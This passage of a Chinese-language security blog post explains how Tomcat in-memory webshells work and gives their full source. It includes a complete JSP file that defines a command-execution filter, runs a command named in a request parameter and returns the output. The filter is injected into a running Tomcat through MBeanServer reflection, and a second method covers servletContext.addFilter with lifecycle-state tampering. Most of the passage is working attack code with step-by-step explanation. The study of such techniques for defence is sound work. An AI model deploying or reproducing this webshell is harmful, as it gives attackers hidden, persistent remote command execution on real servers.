class="keyword">private</span> <span class="keyword">final</span> String cmdParamName = <span class="string">"cmd"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse,</span></span></span><br><span class="line"><span class="function"><span class="params">                         FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        System.out.println(</span><br><span class="line">                <span class="string">"TomcatShellFilter doFilter....................................................................."</span>);</span><br><span class="line">        String cmd;</span><br><span class="line">        <span class="keyword">if</span> ((cmd = servletRequest.getParameter(cmdParamName)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                    <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">            StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">            servletResponse.getOutputStream().flush();</span><br><span class="line">            servletResponse.getOutputStream().close();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        测试结果如下：</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228170513038.png" alt="image-20201228170513038"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228170253396.png" alt="image-20201228170253396"></p>
<p>​        最后给出完整的jsp源码</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.management.MBeanServer"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.tomcat.util.modeler.Registry"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Map"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.HashMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Method"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.tomcat.util.descriptor.web.FilterDef"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;AddFilter&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> REInject</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TomcatShellFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * webshell命令参数名</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String cmdParamName = <span class="string">"sectest666"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse,</span></span></span><br><span class="line"><span class="function"><span class="params">                             FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            String cmd;</span><br><span class="line">            <span class="keyword">if</span> ((cmd = servletRequest.getParameter(cmdParamName)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">                java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                        <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">                StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">                servletResponse.getOutputStream().flush();</span><br><span class="line">                servletResponse.getOutputStream().close();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> String filterName = <span class="string">"TomcatFilterShell"</span>;</span><br><span class="line">    <span class="keyword">final</span> String filterUrlPattern = <span class="string">"/xxxxxxx/*"</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        MBeanServer mBeanServer = Registry.getRegistry(<span class="keyword">null</span>, <span class="keyword">null</span>).getMBeanServer();</span><br><span class="line">        <span class="comment">// 获取mbsInterceptor</span></span><br><span class="line">        Field field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.JmxMBeanServer"</span>).getDeclaredField(<span class="string">"mbsInterceptor"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object mbsInterceptor = field.get(mBeanServer);</span><br><span class="line">        <span class="comment">// 获取repository</span></span><br><span class="line">        field = Class.forName(<span class="string">"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor"</span>).getDeclaredField(<span class="string">"repository"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object repository = field.get(mbsInterceptor);</span><br><span class="line">        <span class="comment">// 获取domainTb</span></span><br><span class="line">        field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.Repository"</span>).getDeclaredField(<span class="string">"domainTb"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap&lt;String, Map&lt;String, NamedObject&gt;&gt; domainTb = (HashMap&lt;String,Map&lt;String,NamedObject&gt;&gt;)field.get(repository);</span><br><span class="line">        <span class="comment">// 获取domain</span></span><br><span class="line">        NamedObject nonLoginAuthenticator = domainTb.get(<span class="string">"Catalina"</span>).get(<span class="string">"context=/,host=localhost,name=NonLoginAuthenticator,type=Valve"</span>);</span><br><span class="line">        out.println(<span class="string">"Inject /,please visit /xxxxxxx/aaaa?sectest666=whoami"</span>);</span><br><span class="line">            <span class="keyword">if</span>(nonLoginAuthenticator==<span class="keyword">null</span>)&#123;</span><br><span class="line">                nonLoginAuthenticator = domainTb.get(<span class="string">"Catalina"</span>).get(<span class="string">"context=/manager,host=localhost,name=BasicAuthenticator,type=Valve"</span>);</span><br><span class="line">                out.println(<span class="string">"Inject /manager,please visit /manager/xxxxxxx/aaaa?sectest666=whoam"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span>).getDeclaredField(<span class="string">"object"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object object = field.get(nonLoginAuthenticator);</span><br><span class="line">        <span class="comment">// 获取resource</span></span><br><span class="line">        field = Class.forName(<span class="string">"org.apache.tomcat.util.modeler.BaseModelMBean"</span>).getDeclaredField(<span class="string">"resource"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object resource = field.get(object);</span><br><span class="line">        <span class="comment">// 获取context</span></span><br><span class="line">        field = Class.forName(<span class="string">"org.apache.catalina.authenticator.AuthenticatorBase"</span>).getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        StandardContext context = (StandardContext) field.get(resource);</span><br><span class="line">        FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">        FilterDef filterDef = context.findFilterDef(filterName);</span><br><span class="line">        Filter filter = <span class="keyword">new</span> TomcatShellFilter();</span><br><span class="line">            <span class="comment">// filterDef</span></span><br><span class="line">        <span class="keyword">if</span> (filterDef == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// Gen filterDef</span></span><br><span class="line">                filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">                filterDef.setFilterName(filterName);</span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">                filterDef.setFilter(filter);</span><br><span class="line">                <span class="comment">// Add filterDef</span></span><br><span class="line">                context.addFilterDef(filterDef);</span><br><span class="line">                <span class="comment">// Refresh filterConfigs</span></span><br><span class="line">                context.filterStart();</span><br><span class="line">                <span class="comment">// filterMap</span></span><br><span class="line">                filterMap.setFilterName(filterName);</span><br><span class="line">                filterMap.setDispatcher(String.valueOf(DispatcherType.REQUEST));</span><br><span class="line">                filterMap.addURLPattern(filterUrlPattern);</span><br><span class="line">                context.addFilterMap(filterMap);</span><br><span class="line">                <span class="comment">// Order</span></span><br><span class="line">                Object[] filterMaps = context.findFilterMaps();</span><br><span class="line">                Object[] tmpFilterMaps = <span class="keyword">new</span> Object[filterMaps.length];</span><br><span class="line">                <span class="keyword">int</span> index = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    FilterMap f = (FilterMap) filterMaps[i];</span><br><span class="line">                    <span class="keyword">if</span> (f.getFilterName().equalsIgnoreCase(filterName)) &#123;</span><br><span class="line">                        tmpFilterMaps[<span class="number">0</span>] = f;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        tmpFilterMaps[index++] = f;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                    filterMaps[i] = tmpFilterMaps[i];</span><br><span class="line">                &#125;</span><br><span class="line">                out.println(<span class="string">"添加Filter成功"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        out.println(<span class="string">"已成功添加"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        out.println(<span class="string">"添加Filter失败"</span>);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="servletContext注册Filter"><a href="#servletContext注册Filter" class="headerlink" title="servletContext注册Filter"></a>servletContext注册Filter</h4><p>​        Servlet，Listener，Filter由ServletContext去加载，无论是使用xml配置还是使用Annotation注解配置，均由Web容器进行初始化，读取其中的配置属性，然后向Web容器中进行注册。Servlet 3.0 可以由ServletContext动态进行注册，因此需在Web容器初始化的时候（即建立ServletContext对象的时候）进行动态注册。 –<code>动态注册之Servlet+Filter+Listener</code></p>
<p>​        在使用servletContext动态注册Filter的过程中，主要使用了下面两个接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">servletContext.addFilter(<span class="string">"Tomcat WebSocket (JSR356) Filter"</span>, <span class="keyword">new</span> WsFilter())</span><br><span class="line">FilterRegistration.Dynamic.addMappingForUrlPatterns(types, <span class="keyword">true</span>, <span class="string">"/*"</span>);</span><br></pre></td></tr></table></figure>

<p>​        之前我们了解到注册Filter主要和FilterDef和FilterMap有关，这两个API为什么可以动态注册Filter，这种注册方式在tomcat中也有使用，代码如下：</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229093140871.png" alt="image-20201229093140871"></p>
<p>​        跟入org.apache.catalina.core.ApplicationContextFacade#addFilter(java.lang.String, javax.servlet.Filter),调用org.apache.catalina.core.ApplicationContext#addFilter(java.lang.String, javax.servlet.Filter)。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229093340066.png" alt="image-20201229093340066"></p>
<p>​        创建filterDef并调用org.apache.catalina.core.StandardContext#addFilterDef将添加filterDef。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229093636388.png" alt="image-20201229093636388"></p>
<p>​        再看看<code>FilterRegistration.Dynamic.addMappingForUrlPatterns(types, true, &quot;/*&quot;);</code>,同样调用addFilterMap添加FilterMap到StandardContext对象中。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229100908801.png" alt="image-20201229100908801"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229100927048.png" alt="image-20201229100927048"></p>
<h5 id="MBeanServer获取servletContext"><a href="#MBeanServer获取servletContext" class="headerlink" title="MBeanServer获取servletContext"></a>MBeanServer获取servletContext</h5><p>​        通过之前的介绍，可以通过MBeanServer获取standardContext，再通过standardContext获取servletContext子类ApplicationContext，并调用addFilter和addMappingForUrlPatterns添加过滤器。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ApplicationContext appContext=<span class="keyword">new</span> ApplicationContext(context);</span><br><span class="line">Filter tomcatShellFilter = <span class="keyword">new</span> TomcatShellFilter();</span><br><span class="line">javax.servlet.FilterRegistration.Dynamic filterRegistration = appContext</span><br><span class="line">        .addFilter(filterName, tomcatShellFilter);</span><br><span class="line">filterRegistration.setInitParameter(<span class="string">"encoding"</span>, <span class="string">"utf-8"</span>);</span><br><span class="line">filterRegistration.setAsyncSupported(<span class="keyword">false</span>);</span><br><span class="line">filterRegistration           .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="keyword">false</span>,<span class="keyword">new</span> String[]&#123;filterUrlPattern&#125;);</span><br></pre></td></tr></table></figure>

<p>​        但在添加过程中发现会报<code>无法将筛选器添加到上下文[/manager]，因为该上下文已初始化</code>异常，经过调试在addFilter中会判断context对象中state的内容是否为STARTING_PREP，由于我们这里已经初始化完成，因此state状态为started，因此会抛异常。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229102204521.png" alt="image-20201229102204521"> </p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229102331539.png" alt="image-20201229102331539"></p>
<p>​    经过上面的分析，再调用addFilter添加Filter之前需要修改context中state的状态</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">        .getDeclaredField("state");</span><br><span class="line">stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);</span><br></pre></td></tr></table></figure>

<p>​    修改状态后虽然可以正常添加Filter过滤器，但是访问Filter会出错。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229103618089.png" alt="image-20201229103618089"></p>
<p>​    因此添加结束后需要将state的内容改回来。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stateField.set(context, org.apache.catalina.LifecycleState.STARTED);</span><br></pre></td></tr></table></figure>

<p>​    更改state状态后再去访问Filter，会返回404</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229104504167.png" alt="image-20201229104504167"></p>
<p>​        调试代码，在FilterMap中确实已经添加了我们的Filter。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229104534258.png" alt="image-20201229104534258"></p>
<p>​        但在FilterConfig中找不到我们的Filter，因此无法调用成功。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229104718640.png" alt="image-20201229104718640"></p>
<p>​        但我们已经将Filter的内容添加到FilterDefs中，经过查看org.apache.catalina.core.StandardContext#filterStart会将filterDefs的内容同步到filterConfigs中，因此需要反射调用filterStart。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229104856204.png" alt="image-20201229104856204"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Method filterStartMethod = org.apache.catalina.core.StandardContext<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">        .getMethod("filterStart");</span><br><span class="line">filterStartMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">filterStartMethod.invoke(context, <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229105256054.png" alt="image-20201229105256054"></p>
<p>​            最终JSP实现代码如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.management.MBeanServer"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.tomcat.util.modeler.Registry"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Map"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.HashMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Method"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.InvocationTargetException"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;servletContext&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span 